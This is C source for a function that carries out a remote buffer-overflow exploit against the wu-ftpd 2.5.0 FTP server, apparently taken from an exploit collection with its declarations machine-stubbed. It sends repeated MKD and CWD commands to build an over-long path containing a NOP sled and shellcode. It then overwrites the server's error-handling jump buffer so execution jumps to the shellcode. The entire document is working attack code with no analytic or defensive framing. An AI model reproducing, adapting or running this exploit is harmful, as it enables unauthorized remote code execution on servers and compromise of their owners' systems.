
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_6__ TYPE_3__ ;
typedef struct TYPE_5__ TYPE_2__ ;
typedef struct TYPE_4__ TYPE_1__ ;


struct TYPE_6__ {int pwdlen; } ;
struct TYPE_5__ {int maxpathlen; int mapped_path; int errcatch; scalar_t__ pad_eax; } ;
struct TYPE_4__ {char* rev; char* user; char* pass; int dirlen; } ;


 int debug ;
 int disp ;
 int err (int ,char*) ;
 int getline () ;
 int getpwd () ;
 TYPE_3__ hostinf ;
 char* int2char (int) ;
 int memcpy (int ,char*,int) ;
 int memset (char*,int,int) ;
 int printf (char*,...) ;
 int putserv (char*,char*) ;
 char* shellcode ;
 TYPE_2__* sptr ;
 int strcat (char*,char*) ;
 int strlen (char*) ;
 scalar_t__ strncmp (char*,char*,int) ;
 TYPE_1__ tesopt ;

int
wuftpd_250_sploitit (void)
{
    int shelloff,
        times,
        fill;
    int start_writing_to_errcatch,
        argvlen,
        behind_errcatch;
    int i, n;
    char string[2048];

    argvlen = strlen ("ftpd: ");
    argvlen += strlen (tesopt.rev);
    argvlen += strlen (": ");
    argvlen += strlen (tesopt.user);
    argvlen += strlen (": ");

    if (strncmp ("anonymous", tesopt.user, 9) == 0)
        argvlen += strlen (tesopt.pass) + 1;

    times = (sptr->maxpathlen-hostinf.pwdlen) / (tesopt.dirlen + 1);

    fill = sptr->maxpathlen-hostinf.pwdlen - (tesopt.dirlen + 1) * times;

    if (debug > 0) {
        printf ("CWD %d + (dirlen %d * %d times) + fill %d = %d\n",
                hostinf.pwdlen, tesopt.dirlen, times, fill, sptr->maxpathlen);
    }

    if (strlen (shellcode) > (tesopt.dirlen - 40))
        err(0, "shellcode too big, edit the source to use less padding,"
                "\nhmm.. this shouldn't have happened with LaM3rZ shellcode!");


    shelloff = sptr->mapped_path + hostinf.pwdlen
                            + ( (tesopt.dirlen - strlen(shellcode)) / 2);

    if (debug > 0)
        printf ("will try to longjmp to 0x%x\n", shelloff);

    start_writing_to_errcatch = sptr->errcatch - argvlen;
    behind_errcatch = sptr->errcatch + (6 * 4) + 2 + 8;

    if (debug > 0) {
        printf ("errcatch(0x%x) - argvlen(%d) = start 0x%x - end 0x%x\n",
                sptr->errcatch, argvlen, start_writing_to_errcatch, behind_errcatch);
    }

    memset (string, 'A', tesopt.dirlen);

    if (debug<3)
        disp = 0;
    for (i = 0; i < times; i++) {
            switch (i) {
            case 0: memset (string, 0x90, tesopt.dirlen);
                    memcpy (string+tesopt.dirlen-strlen(shellcode),
                            shellcode, strlen (shellcode));
                    break;
            case 1: memset (string, 0x90, tesopt.dirlen); break;
            default:
                    break;
            }

            string[tesopt.dirlen] = 0;
            putserv ("MKD %s\n", string);
            getline ();

            putserv ("CWD %s\n", string);
            getline ();
    }

    getpwd ();
    disp = 1;

    if (debug > 0)
        printf ("Now %d bytes deep in dir structure.\n", hostinf.pwdlen);

    if (fill != sptr->maxpathlen-hostinf.pwdlen)
        err (0, "Calculation wrong. Error!");

    if (fill > 506)
        err (0, "Aw.. fuck! My fill is waaaay to big!\n");


    fill += sptr->pad_eax ? 12 : 8;

    n = fill/4;
    string[0] = 0;
    for (i=0; i < n; i++)
        strcat(string, int2char(start_writing_to_errcatch));
    for (i=1; i < (fill - (n*4)); i++)
        strcat(string, "A");


    strcat (string, int2char (sptr->mapped_path+hostinf.pwdlen+13));
    strcat (string, int2char (behind_errcatch));

    if (debug > 0)
            printf ("Sending final CWD\n");

    if (strlen (string) < 20)
    err (0, "cwd string too short.. check for 0x0's.\n");

    putserv ("CWD %s\n", string);
    getline ();



    if (debug > 0)
            printf ("Sending jmpbuf\n");

    string[0] = 0;
    for (i=0; i<8; i++)
        strcat (string, int2char (shelloff));

    if (strlen (string) != 32)
            err (0, "jmpbuf string too short.. check for 0x0's.\n");

    putserv ("%s\n", string);

    getline ();

    return (1);
}
